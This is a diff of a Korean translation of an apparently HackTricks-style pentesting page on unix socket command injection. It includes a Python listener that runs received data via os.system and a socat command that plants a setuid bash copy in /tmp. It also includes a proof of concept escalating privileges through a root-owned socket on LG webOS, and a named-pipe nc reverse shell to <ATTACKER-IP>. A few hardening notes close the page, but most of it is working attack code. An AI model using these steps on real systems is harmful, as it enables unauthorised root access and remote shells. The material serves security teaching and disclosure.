@@ -1,10 +1,8 @@
 # Socket Command Injection
 
-{{#include ../../banners/hacktricks-training.md}}
+## Python을 사용한 socket binding 예제
 
-## Python을 사용한 Socket binding 예제
-
-다음 예제에서는 **unix socket이 생성되고** (`/tmp/socket_test.s`) **수신된 모든 내용이** `os.system`에 의해 **실행됩니다**.실제 환경에서 이런 코드를 발견할 가능성은 낮지만, 이 예제의 목적은 unix sockets를 사용하는 코드가 어떤 형태인지 확인하고, 최악의 경우를 가정해 입력을 처리하는 방법을 살펴보는 것입니다.
+다음 예제에서는 **unix socket이 생성되고** (`/tmp/socket_test.s`) **수신된** 모든 내용이 `os.system`에 의해 **실행됩니다**.실제 환경에서는 이런 사례를 찾지 못할 수도 있지만, 이 예제의 목적은 unix sockets를 사용하는 코드가 어떤 형태인지 확인하고 최악의 경우에 입력을 처리하는 방법을 살펴보는 것입니다.
 ```python:s.py
 import socket
 import os, os.path
@@ -26,7 +24,7 @@ print(datagram)
 os.system(datagram)
 conn.close()
 ```
-**실행**: `python s.py`를 사용하여 코드를 **실행**하고 **socket이 어떻게 listening 중인지 확인**합니다:
+**실행** `python s.py`를 사용해 코드를 실행하고 **socket이 어떻게 listening 중인지 확인**하세요:
 ```python
 netstat -a -p --unix | grep "socket_test"
 (Not all processes could be identified, non-owned process info
@@ -39,14 +37,17 @@ echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat -
 ```
 ## 사례 연구: Root-owned UNIX socket signal-triggered escalation (LG webOS)
 
-일부 권한이 높은 daemon은 신뢰할 수 없는 입력을 받으며, 권한이 있는 작업을 thread-ID 및 signal과 연결하는 Root-owned UNIX socket을 노출합니다. 프로토콜에서 권한이 없는 client가 대상이 되는 native thread를 지정할 수 있다면, 권한이 있는 code path를 trigger하여 권한을 상승시킬 수 있습니다.<sup>[[1]](#references)</sup>
+일부 권한 있는 daemon은 신뢰할 수 없는 입력을 허용하고 권한 있는 작업을 thread-ID 및 signal과 연결하는 root-owned UNIX socket을 노출합니다. 프로토콜을 통해 권한이 없는 client가 대상 native thread를 지정할 수 있다면, 권한 있는 code path를 트리거하여 권한 상승을 수행할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>
+
+주요 write-up과 disclosure에서는 다음과 같은 sequence를 설명합니다.<sup>[[1]](#references)[[2]](#references)</sup>
 
 관찰된 패턴:
-- Root-owned socket(예: /tmp/remotelogger)에 연결합니다.
-- thread를 생성하고 native thread id(TID)를 가져옵니다.
-- TID를 packed 형태로 padding과 함께 request로 전송하고 acknowledgement를 받습니다.
-- 특정 signal을 해당 TID로 전달하여 privileged behaviour를 trigger합니다.
+- root-owned socket(예: /tmp/remotelogger)에 연결합니다.
+- thread를 생성하고 해당 native thread id(TID)를 가져옵니다.
+- padding과 함께 TID를 packed 형식으로 request로 전송하고 acknowledgement를 받습니다.
+- 해당 TID에 특정 signal을 전달하여 권한 있는 동작을 트리거합니다.
 
+아래의 축약된 PoC는 이 sequence를 그대로 따릅니다.<sup>[[1]](#references)[[2]](#references)</sup>
 최소 PoC 개요:
 ```python
 import socket, struct, os, threading, time
@@ -59,17 +60,16 @@ s.sendall(struct.pack('<L', tid) + b'A'*0x80)
 s.recv(4)  # sync
 os.kill(tid, 4)  # deliver SIGILL (example from the case)
 ```
-이를 root shell로 전환하려면 간단한 named-pipe + nc 패턴을 사용할 수 있습니다:
+이를 root shell로 전환하려면 간단한 named-pipe + nc 패턴을 사용할 수 있습니다.<sup>[[2]](#references)</sup>
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
-참고:
-- 이 유형의 버그는 권한이 없는 client state(TIDs)에서 파생된 값을 신뢰하고, 이를 권한 있는 signal handler 또는 logic에 연결할 때 발생합니다.
-- socket에서 credentials를 강제하고, message format을 검증하며, 권한 있는 작업을 외부에서 제공된 thread identifier와 분리하여 보안을 강화합니다.
+- 이 유형의 버그는 권한이 없는 client 상태(TIDs)에서 파생된 값을 신뢰하고, 이를 권한이 있는 signal handler 또는 logic에 연결할 때 발생합니다.<sup>[[1]](#references)</sup>
+- socket에 credentials 적용, message format 검증, 외부에서 제공된 thread identifier와 권한 작업의 분리를 통해 보안을 강화합니다.
 
-## 참고 자료
+## References
 
-- [1] [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
-
+- [1] [재미로 webOS Jailbreak하기 (그냥 재미로)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
+- [2] [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
 {{#include ../../banners/hacktricks-training.md}}
